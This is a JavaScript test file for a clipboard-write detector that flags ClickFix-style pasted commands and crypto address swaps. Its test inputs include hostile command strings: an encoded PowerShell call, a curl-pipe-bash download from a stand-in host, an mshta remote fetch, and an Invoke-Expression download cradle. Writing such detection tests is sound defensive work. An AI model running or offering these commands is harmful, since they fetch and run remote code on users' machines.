'use strict';
const test = require('node:test');
const assert = require('node:assert');
const { analyzeClipboardWrite, clipboardTier } = require('../../engine/clipboard_rules');

test('PowerShell payload is dangerous', () => {
  const r = analyzeClipboardWrite('powershell -enc SQBFAFgA...');
  assert.strictEqual(r.level, 'dangerous');
  assert.ok(r.reasons.some((x) => x.code === 'clipboardCommand' && x.kind === 'clipboard'));
});

test('curl pipe bash is dangerous', () => {
  assert.strictEqual(analyzeClipboardWrite('curl http://evil.sh | bash').level, 'dangerous');
});

test('mshta / Invoke-Expression is dangerous', () => {
  assert.strictEqual(analyzeClipboardWrite('mshta http://x/a.hta').level, 'dangerous');
  assert.strictEqual(analyzeClipboardWrite('iex(New-Object Net.WebClient)').level, 'dangerous');
});

test('bare ETH address is suspicious (address-swap)', () => {
  const r = analyzeClipboardWrite('0x' + 'a'.repeat(40));
  assert.strictEqual(r.level, 'suspicious');
  assert.ok(r.reasons.some((x) => x.code === 'clipboardCryptoAddress'));
});

test('normal text is safe', () => {
  assert.strictEqual(analyzeClipboardWrite('Hello, here is the article link.').level, 'safe');
  assert.strictEqual(analyzeClipboardWrite('').level, 'safe');
  assert.strictEqual(analyzeClipboardWrite(null).level, 'safe');
});

test('clipboardTier: safe → none, clickfix → block, gesture → notice, no gesture → warn', () => {
  assert.strictEqual(clipboardTier({ level: 'safe', clickfixLevel: 'dangerous', userGesture: true }), 'none');
  assert.strictEqual(clipboardTier({ level: 'dangerous', clickfixLevel: 'dangerous', userGesture: true }), 'block');
  assert.strictEqual(clipboardTier({ level: 'dangerous', clickfixLevel: 'suspicious', userGesture: true }), 'notice');
  assert.strictEqual(clipboardTier({ level: 'suspicious', clickfixLevel: 'none', userGesture: true }), 'notice');
  assert.strictEqual(clipboardTier({ level: 'dangerous', clickfixLevel: 'none', userGesture: false }), 'warn');
  assert.strictEqual(clipboardTier({}), 'none');
});
